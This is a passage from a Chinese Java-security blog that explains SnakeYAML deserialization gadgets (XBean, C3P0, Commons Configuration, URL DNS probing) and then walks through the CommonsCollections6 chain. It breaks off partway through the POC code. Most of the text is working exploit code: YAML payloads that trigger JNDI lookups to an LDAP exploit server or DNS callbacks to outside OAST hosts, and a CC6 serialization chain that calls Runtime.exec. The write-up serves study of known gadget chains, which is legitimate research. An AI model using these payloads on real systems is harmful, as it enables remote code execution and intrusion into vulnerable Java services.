<p>这里有个<code>isSingleton</code>函数检查:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428182555.png" alt="image.png"><br>需要也传个<code>shareableResources</code><br>进入lookup,完成JNDI</p>
<h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[\&quot;Drunkbaby\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;calc\&quot;, \&quot;http://localhost:8900/\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个exp很有东西,看了Drun1baby师傅的博客学到很多<br><code>BadAttributeValueExpException</code>的构造方法可以接收一个对象并调用它的toString()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240429200350.png" alt="image.png"><br>这个val是我们传入的<code>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</code><br>它没有toString()方法,它的父类Binding有<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240429200451.png" alt="image.png"><br>调用getObject()方法,回到<code>ReadOnlyBinding</code>的getObject()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240429200550.png" alt="image.png"><br>进入resolve()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240429200619.png" alt="image.png"><br>发现jndi注入点</p>
<h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>c3p0的jndi的sink点直接构造<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  jndiName: \&quot;ldap://localhost:1389/Basic/Command/calc\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  loginTimeout: 0&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><p>c3p0的hex反序列化sink点<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMapquot;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;ldap://127.0.0.1:1389/Basic/Command/calc\&quot;]]: 1&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sink点在JNDIConfiguration.getKeys()方法里</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>根据urldns链可以知道URL类的hashCode()方法会进入<code>URLStreamHandler.hashcode()-&gt;URLStreamHandler.getHostAddress-&gt;InetAddress.getByname(host)</code>完成dns探测</p>
<p>HashMap的键值存储是<code>&#123;key1: value1,key2,value2&#125;</code>格式的,我们直接传入map:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://67bkvkhgehq8b376cycmkf20frlh96.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240429214934.png" alt="image.png"></p>
<p>也可以这样构造map:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String poc = &quot;&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\&quot;http://tcbua9.ceye.io/\&quot;]: 1&#125;&quot;;</span><br></pre></td></tr></table></figure></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/">https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化之CC6链分析</title>
    <url>/2024/05/07/CC6/</url>
    <content><![CDATA[<p>由于jdk8u71之后<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的逻辑变化了,没有setValue()方法了:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240505125213.png" alt="image.png"></p>
<p>CommonsCollections6是commons-collections这个库中相对⽐较通⽤的利⽤链,不限制jdk版本</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境:"></a>环境:</h3><ul>
<li>jdk8u71,地址:</li>
<li>Comoons-Collections 3.2.1</li>
<li>poe.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="调用过程梳理"><a href="#调用过程梳理" class="headerlink" title="调用过程梳理"></a>调用过程梳理</h3><p>首先是expMap.put,expMap是HashMap类型,相当于HashMap.put()<br>然后是调用hash(key),这个key是传入的tiedMapEntry<br>然后是key.hashCode()相当于TiedMapEntry.hashCode()<br>然后是this.getValue(),也就是TiedMapEntry.getValue()<br>然后是this.map.get(this.key),这个map已经被设置了lazyMap<br>然后是LazyMap.get(),这里map是空的HashMap,factory是恶意的chainedTransformer</p>
<h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析:"></a>过程分析:</h3><p>不变的是LazyMap的get()方法到InvokerTransformer.transform()方法<br>而TiedMapEntry的getValue()方法调用了LazyMap的get()方法<br>我们可以观察一下:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>观察<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>类可以发现:其hashcode()方法调用getValue()方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>找谁调用了TiedMapEntry的hashcode()方法,<br>而HashMap的put()方法直接调用HashMap的hash方法进而调用<br><code>key.hashCode()</code>方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这里把key设置为TiedMapEntry就行了</p>
<p>举个例子分析一下:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMapEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line"> <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line"> <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/27/zGOCdspgnfVT1UL.png" alt="image.png"></p>
<ol>
<li><p>首先定义一个空的hashmap,然后定义一个lazymap:它是一个Map类型,通过decorate()方法new了一个LazyMap,构造函数map是传进来的hashmap,factory是恶意的chainedTransformer<br>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">this</span>.factory = factory;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后定义了一个tiedMapEntry,它的构造函数是public类型的所以我们可以直接使用,设置了map是lazymap,key是字符串”key”</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>然后又新建一个HashMap类型的expMap,调用它的put()方法,传参tiedMapEntry和字符串”value”</li>
</ol>
<p>首先会调用HashMap#put()<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>key是tiedMapEntry,然后调用hash(key)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="type">int</span> h;</span><br><span class="line">     <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><br>然后是key.hashCode()也就是tiedMapEntry#hashCode()<br>TiedMapEntry#hashCode()代码如下:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>然后是TiedMapEntry#getValue()<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里的map已经设置为了lazyMap,然后就是LazyMap的get()方法:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>map是构造的空的HashMap,factory是构造好的chainedTransformer,==这里的key之前也被设置为了字符串”key”==<br>正常思路是此时会寻找key,没找到就会进入if语句进而执行<code>factory.transform(key)</code><br>但是不会,原因下面说</p>
<h3 id="LazyMap-get-方法的问题"><a href="#LazyMap-get-方法的问题" class="headerlink" title="LazyMap#get()方法的问题"></a>LazyMap#get()方法的问题</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 HashMap 的 hash 方法完成链子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是当我们打断点时会发现在序列化的时候已经弹出计算器了,或者说是在<code>expMap.put(tiedMapEntry, &quot;value&quot;);</code>的时候就已经弹出计算器了(我们可以把序列化和反序列化函数注释掉运行尝试),这就有点像URLDNS链子的一样的问题了</p>
<p><img src="https://s2.loli.net/2023/09/27/eZhVRE4iYHwgBms.png" alt="image.png"><br>然后把”key”这个字符串写入键,当我们反序列化的时候走到LazyMap.get()方法是由于之前序列化的时候写入进入了导致无法进入if循环,rce</p>
<p>做了两个操作:</p>
<ul>
<li>LazyMap的factory再put方法之前设置为一个无用的Transformed,比如new ConstantTransformer(“test”),在put()之后再利用反射设置回来</li>
<li>lazyMap.remove(“key”);在构造好tiedMapEntry后把他的初始key-value给删了让他能进入if语句</li>
</ul>
<h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1:"></a>POC1:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"> </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span 